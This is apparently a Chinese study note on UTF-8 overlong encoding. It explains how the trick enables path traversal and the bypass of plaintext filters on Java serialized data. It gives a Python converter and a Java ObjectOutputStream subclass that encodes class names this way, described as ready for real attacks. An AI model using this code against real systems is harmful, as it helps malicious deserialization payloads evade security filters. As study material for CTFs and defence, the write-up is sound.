# UTF-8 Overlong Encoding
## 学习
 - [P牛的博客很详细了，可以直接看这个](https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html)
我们都清楚utf-8这个编码，可以将unicode码表里的所有字符，用某种计算方式转换成长度是1到4位字节的字符。  
正常来讲，比如\xE2\x82\xAC即为欧元符号€的UTF-8编码
可谓是很好用了  
当然对于一些ascii字符比如`.`，utf8只会给它编码一位utf字符，但是我们给它强行补0编码成两位utf字符呢？utf编码方式也是可以理解
```
例如，点号：0x2E的二进制是10 1110
给其前面补5个0，变成00000101110
再utf编码方式=>将其分成5位、6位两组：00000，101110;分别给这两组增加前缀110，10，结果是11000000，10101110，对应的是\xC0\xAE
```
在utf-8看来，`\xC0\xAE`可以被理解位`.`号  
因此在一些情况可以用`Overlong Encoding`，实现目录穿越，实现任意文件读取or上传  
回到主题，就是在任何直接对我们传入的序列化数据做明文检测的地方，我们都可以用这个方式进行`Overlong Encoding`实现绕过，24年的京麒CTF就可以这样打  

这里P牛给了个转换的脚本
```python
def convert_int(i: int) -> bytes:
    b1 = ((i >> 6) & 0b11111) | 0b11000000
    b2 = (i & 0b111111) | 0b10000000
    return bytes([b1, b2])


def convert_str(s: str) -> bytes:
    bs = b''
    for ch in s.encode():
        bs += convert_int(ch)

    return bs


if __name__ == '__main__':
    print(convert_str('.')) # b'\xc0\xae'
    print(convert_str('org.example.Evil')) # b'\xc1\xaf\xc1\xb2\xc1\xa7\xc0\xae\xc1\xa5\xc1\xb8\xc1\xa1\xc1\xad\xc1\xb0\xc1\xac\xc1\xa5\xc0\xae\xc1\x85\xc1\xb6\xc1\xa9\xc1\xac'
```
## CODE
在实战，我们只需用下面重写的ObjectOutputStream即可
```java
package com.example.jsrc.exp;
 
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
 
public class CustomObjectOutputStream extends ObjectOutputStream {
 
    private static HashMap<Character, int[]> map;
    static {
        map = new HashMap<>();
        map.put('.', new int[]{0xc0, 0xae});
        map.put(';', new int[]{0xc0, 0xbb});
        map.put('$', new int[]{0xc0, 0xa4});
        map.put('[', new int[]{0xc1, 0x9b});
        map.put(']', new int[]{0xc1, 0x9d});
        map.put('a', new int[]{0xc1, 0xa1});
        map.put('b', new int[]{0xc1, 0xa2});
        map.put('c', new int[]{0xc1, 0xa3});
        map.put('d', new int[]{0xc1, 0xa4});
        map.put('e', new int[]{0xc1, 0xa5});
        map.put('f', new int[]{0xc1, 0xa6});
        map.put('g', new int[]{0xc1, 0xa7});
        map.put('h', new int[]{0xc1, 0xa8});
        map.put('i', new int[]{0xc1, 0xa9});
        map.put('j', new int[]{0xc1, 0xaa});
        map.put('k', new int[]{0xc1, 0xab});
        map.put('l', new int[]{0xc1, 0xac});
        map.put('m', new int[]{0xc1, 0xad});
        map.put('n', new int[]{0xc1, 0xae});
        map.put('o', new int[]{0xc1, 0xaf}); // 0x6f
        map.put('p', new int[]{0xc1, 0xb0});
        map.put('q', new int[]{0xc1, 0xb1});
        map.put('r', new int[]{0xc1, 0xb2});
        map.put('s', new int[]{0xc1, 0xb3});
        map.put('t', new int[]{0xc1, 0xb4});
        map.put('u', new int[]{0xc1, 0xb5});
        map.put('v', new int[]{0xc1, 0xb6});
        map.put('w', new int[]{0xc1, 0xb7});
        map.put('x', new int[]{0xc1, 0xb8});
        map.put('y', new int[]{0xc1, 0xb9});
        map.put('z', new int[]{0xc1, 0xba});
        map.put('A', new int[]{0xc1, 0x81});
        map.put('B', new int[]{0xc1, 0x82});
        map.put('C', new int[]{0xc1, 0x83});
        map.put('D', new int[]{0xc1, 0x84});
        map.put('E', new int[]{0xc1, 0x85});
        map.put('F', new int[]{0xc1, 0x86});
        map.put('G', new int[]{0xc1, 0x87});
        map.put('H', new int[]{0xc1, 0x88});
        map.put('I', new int[]{0xc1, 0x89});
        map.put('J', new int[]{0xc1, 0x8a});
        map.put('K', new int[]{0xc1, 0x8b});
        map.put('L', new int[]{0xc1, 0x8c});
        map.put('M', new int[]{0xc1, 0x8d});
        map.put('N', new int[]{0xc1, 0x8e});
        map.put('O', new int[]{0xc1, 0x8f});
        map.put('P', new int[]{0xc1, 0x90});
        map.put('Q', new int[]{0xc1, 0x91});
        map.put('R', new int[]{0xc1, 0x92});
        map.put('S', new int[]{0xc1, 0x93});
        map.put('T', new int[]{0xc1, 0x94});
        map.put('U', new int[]{0xc1, 0x95});
        map.put('V', new int[]{0xc1, 0x96});
        map.put('W', new int[]{0xc1, 0x97});
        map.put('X', new int[]{0xc1, 0x98});
        map.put('Y', new int[]{0xc1, 0x99});
        map.put('Z', new int[]{0xc1, 0x9a});
    }
    public CustomObjectOutputStream(OutputStream out) throws IOException {
        super(out);
    }
 
    @Override
    protected void writeClassDescriptor(ObjectStreamClass desc) throws IOException {
        String name = desc.getName();
//        writeUTF(desc.getName());
        writeShort(name.length() * 2);
        for (int i = 0; i < name.length(); i++) {
            char s = name.charAt(i);
//            System.out.println(s);
            write(map.get(s)[0]);
            write(map.get(s)[1]);
        }
        writeLong(desc.getSerialVersionUID());
        try {
            byte flags = 0;
            if ((boolean)getFieldValue(desc,"externalizable")) {
                flags |= ObjectStreamConstants.SC_EXTERNALIZABLE;
                Field protocolField = ObjectOutputStream.class.getDeclaredField("protocol");
                protocolField.setAccessible(true);
                int protocol = (int) protocolField.get(this);
                if (protocol != ObjectStreamConstants.PROTOCOL_VERSION_1) {
                    flags |= ObjectStreamConstants.SC_BLOCK_DATA;
                }
            } else if ((boolean)getFieldValue(desc,"serializable")){
                flags |= ObjectStreamConstants.SC_SERIALIZABLE;
            }
            if ((boolean)getFieldValue(desc,"hasWriteObjectData")) {
                flags |= ObjectStreamConstants.SC_WRITE_METHOD;
            }
            if ((boolean)getFieldValue(desc,"isEnum") ) {
                flags |= ObjectStreamConstants.SC_ENUM;
            }
            writeByte(flags);
            ObjectStreamField[] fields = (ObjectStreamField[]) getFieldValue(desc,"fields");
            writeShort(fields.length);
            for (int i = 0; i < fields.length; i++) {
                ObjectStreamField f = fields[i];
                writeByte(f.getTypeCode());
                writeUTF(f.getName());
                if (!f.isPrimitive()) {
                    Method writeTypeString = ObjectOutputStream.class.getDeclaredMethod("writeTypeString",String.class);
                    writeTypeString.setAccessible(true);
                    writeTypeString.invoke(this,f.getTypeString());
//                    writeTypeString(f.getTypeString());
                }
            }
        } catch (NoSuchFieldException e) {
            throw new RuntimeException(e);
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        } catch (NoSuchMethodException e) {
            throw new RuntimeException(e);
        } catch (InvocationTargetException e) {
            throw new RuntimeException(e);
        }
    }
 
    public static Object getFieldValue(Object object, String fieldName) throws NoSuchFieldException, IllegalAccessException {
        Class<?> clazz = object.getClass();
        Field field = clazz.getDeclaredField(fieldName);
        field.setAccessible(true);
        Object value = field.get(object);
 
        return value;
    }
}
```
## 参考
 - [https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html](https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html)